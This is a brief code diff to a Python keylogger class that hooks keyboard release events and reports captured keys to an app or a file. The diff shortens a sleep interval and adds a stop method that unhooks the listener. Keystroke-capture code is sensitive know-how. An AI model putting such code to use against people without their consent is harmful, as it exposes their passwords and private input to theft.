@@ -70,10 +70,13 @@ class KeyboardLogger():
         keyboard.on_release(callback=self.callback)
         self.report()
         if self.report_method=='app':
-            time.sleep(1) 
+            time.sleep(.5) 
         
         elif self.report_method=='file':
             keyboard.wait()
+    
+    def stop(self):
+        keyboard.unhook_all()
 
 if __name__=='__main__':
     KL = KeyboardLogger(interval=10)
